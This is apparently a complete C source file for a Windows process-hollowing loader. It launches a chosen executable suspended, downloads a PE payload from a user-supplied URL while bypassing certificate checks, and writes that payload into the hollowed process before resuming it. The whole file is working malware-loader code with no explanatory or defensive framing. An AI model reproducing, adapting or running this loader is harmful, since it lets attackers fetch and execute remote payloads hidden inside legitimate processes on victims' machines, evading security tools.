#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <wininet.h>

#pragma comment(lib,"ntdll.lib")
#pragma comment(lib,"wininet")

#define BUFFER_SIZE 1024000
#define SECURITY_FLAG_IGNORE_UNKNOWN_CA         0x00000100

EXTERN_C NTSTATUS NTAPI NtTerminateProcess(HANDLE, NTSTATUS);
EXTERN_C NTSTATUS NTAPI NtReadVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
EXTERN_C NTSTATUS NTAPI NtWriteVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
EXTERN_C NTSTATUS NTAPI NtGetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtSetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);
EXTERN_C NTSTATUS NTAPI NtResumeThread(HANDLE, PULONG);

int wmain(int argc, wchar_t* argv[])
{
	PIMAGE_DOS_HEADER pDosH;
	PIMAGE_NT_HEADERS pNtH;
	PIMAGE_SECTION_HEADER pSecH;

	PVOID image, mem, base;
	DWORD i;

	HINTERNET hInternetSession;
	HINTERNET hURL;
	HANDLE hReq;
	DWORD dwBytesRead = 1;

	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	CONTEXT ctx;

	ctx.ContextFlags = CONTEXT_FULL;

	memset(&si, 0, sizeof(si));
	memset(&pi, 0, sizeof(pi));

	if (argc < 3)
	{
		printf("\nUsage: [Target executable] [Payload URL]\n");
		return 1;
	}

	printf("\n[+] Running the target executable.");

	if (!CreateProcessW(NULL, argv[1], NULL, NULL, FALSE, CREATE_SUSPENDED|CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) // Start the target application
	{
		printf("\n[-] Error: Unable to run the target executable. CreateProcess failed with error %d", GetLastError());
		return 1;
	}

	printf("\n[+] Process created in suspended state.");
	printf("\n[+] Connecting to URL for downloading payload");
	
	image = VirtualAlloc(NULL, BUFFER_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // Allocate memory for the executable file: 1MB

	WCHAR hostname[1024], fileUrlPath[1024], scheme[1024];
	URL_COMPONENTS urlcomponents;
	memset(&urlcomponents, 0, sizeof(urlcomponents));
	urlcomponents.dwStructSize = sizeof(URL_COMPONENTS);
	urlcomponents.dwHostNameLength = 1024;
	urlcomponents.dwUrlPathLength = 1024;
	urlcomponents.dwSchemeLength = 1024;
	urlcomponents.lpszHostName = hostname;
	urlcomponents.lpszUrlPath = fileUrlPath;
	urlcomponents.lpszScheme = scheme;
	if (!InternetCrackUrl(argv[2], lstrlenW(argv[2]), 0, &urlcomponents)) {
		printf("\n[-] Error parsing the URL: %d", GetLastError());
		return -1;
	}
	hInternetSession = InternetOpen(L"sim-ba", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	hURL = InternetConnect(hInternetSession, hostname, urlcomponents.nPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);

	if (lstrcmpiW(scheme, L"https") == 0) {
		printf("\n[*] Connecting using HTTPS");
		hReq = HttpOpenRequest(hURL, L"GET", fileUrlPath, NULL, NULL, NULL, INTERNET_FLAG_SECURE|INTERNET_FLAG_IGNORE_CERT_CN_INVALID|INTERNET_FLAG_NO_CACHE_WRITE, 0);
	}
	else {
		hReq = HttpOpenRequest(hURL, L"GET", fileUrlPath, NULL, NULL, NULL, INTERNET_FLAG_NO_CACHE_WRITE, 0);
	}
	HttpSendRequest(hReq, NULL, 0, NULL, 0);
	if (GetLastError() == ERROR_INTERNET_INVALID_CA) {
		printf("\n[*] Ignoring SSL Certificate Error");
		DWORD dwFlags;
		DWORD dwBuffLen = sizeof(dwFlags);
		InternetQueryOption(hReq, INTERNET_OPTION_SECURITY_FLAGS, (LPVOID)&dwFlags, &dwBuffLen);
		dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA;
		InternetSetOption(hReq, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
	}

	if (!HttpSendRequest(hReq, NULL, 0, NULL, 0)) {
		printf("\n[-] Error Sending Http Request: %d", GetLastError());
		return -1; 
	}

	for (; dwBytesRead > 0;)
	{
		InternetReadFile(hReq, image, (DWORD)BUFFER_SIZE, &dwBytesRead);
	}

	InternetCloseHandle(hURL);
	InternetCloseHandle(hInternetSession);

	pDosH = (PIMAGE_DOS_HEADER)image;

	if (pDosH->e_magic != IMAGE_DOS_SIGNATURE) // Check for valid executable
	{
		printf("\n[-] Error: Invalid executable format.");
		NtTerminateProcess(pi.hProcess, 1); // We failed, terminate the child process.
		return 1;
	}

	pNtH = (PIMAGE_NT_HEADERS)((LPBYTE)image + pDosH->e_lfanew); // Get the address of the IMAGE_NT_HEADERS

	NtGetContextThread(pi.hThread, &ctx); // Get the thread context of the child process's primary thread

#ifdef _WIN64
	NtReadVirtualMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &base, sizeof(PVOID), NULL); // Get the PEB address from the ebx register and read the base address of the executable image from the PEB
#endif

#ifdef _X86_
	NtReadVirtualMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &base, sizeof(PVOID), NULL); // Get the PEB address from the ebx register and read the base address of the executable image from the PEB
#endif
	if ((SIZE_T)base == pNtH->OptionalHeader.ImageBase) // If the original image has same base address as the replacement executable, unmap the original executable from the child process.
	{
		printf("\n[*] Unmapping original executable image from child process. Address: %#zx", (SIZE_T)base);
		NtUnmapViewOfSection(pi.hProcess, base); // Unmap the executable image using NtUnmapViewOfSection function
	}

	printf("\n[+] Allocating memory in child process.");

	mem = VirtualAllocEx(pi.hProcess, (PVOID)pNtH->OptionalHeader.ImageBase, pNtH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // Allocate memory for the executable image

	if (!mem)
	{
		printf("\n[-] Error: Unable to allocate memory in child process. VirtualAllocEx failed with error %d", GetLastError());

		NtTerminateProcess(pi.hProcess, 1); // We failed, terminate the child process.
		return 1;
	}

	printf("\n[*] Memory allocated. Address: %#zx", (SIZE_T)mem);

	printf("\n[+] Writing executable image into child process.");

	NtWriteVirtualMemory(pi.hProcess, mem, image, pNtH->OptionalHeader.SizeOfHeaders, NULL); // Write the header of the replacement executable into child process

	for (i = 0; i < pNtH->FileHeader.NumberOfSections; i++)
	{
		pSecH = (PIMAGE_SECTION_HEADER)((LPBYTE)image + pDosH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		NtWriteVirtualMemory(pi.hProcess, (PVOID)((LPBYTE)mem + pSecH->VirtualAddress), (PVOID)((LPBYTE)image + pSecH->PointerToRawData), pSecH->SizeOfRawData, NULL); // Write the remaining sections of the replacement executable into child process
	}


#ifdef _WIN64
	ctx.Rcx = (SIZE_T)((LPBYTE)mem + pNtH->OptionalHeader.AddressOfEntryPoint); // Set the eax register to the entry point of the injected image

	printf("\n[*] New entry point: %#zx", ctx.Rcx);

	NtWriteVirtualMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &pNtH->OptionalHeader.ImageBase, sizeof(PVOID), NULL); // Write the base address of the injected image into the PEB
#endif

#ifdef _X86_
	ctx.Eax = (SIZE_T)((LPBYTE)mem + pNtH->OptionalHeader.AddressOfEntryPoint); // Set the eax register to the entry point of the injected image

	printf("\n[*] New entry point: %#zx", ctx.Eax);

	NtWriteVirtualMemory(pi.hProcess, (PVOID)(ctx.Ebx + (sizeof(SIZE_T) * 2)), &pNtH->OptionalHeader.ImageBase, sizeof(PVOID), NULL); // Write the base address of the injected image into the PEB
#endif


	printf("\n[+] Setting the context of the child process's primary thread.");

	NtSetContextThread(pi.hThread, &ctx); // Set the thread context of the child process's primary thread

	printf("\n[+] Resuming child process's primary thread.");

	NtResumeThread(pi.hThread, NULL); // Resume the primary thread

	printf("\n[+] Thread resumed.");

	//NtWaitForSingleObject(pi.hProcess, FALSE, NULL); // Wait for the child process to terminate
	Sleep(5000);

	NtClose(pi.hThread); // Close the thread handle
	NtClose(pi.hProcess); // Close the process handle

	VirtualFree(image, 0, MEM_RELEASE); // Free the allocated memory
	return 0;
}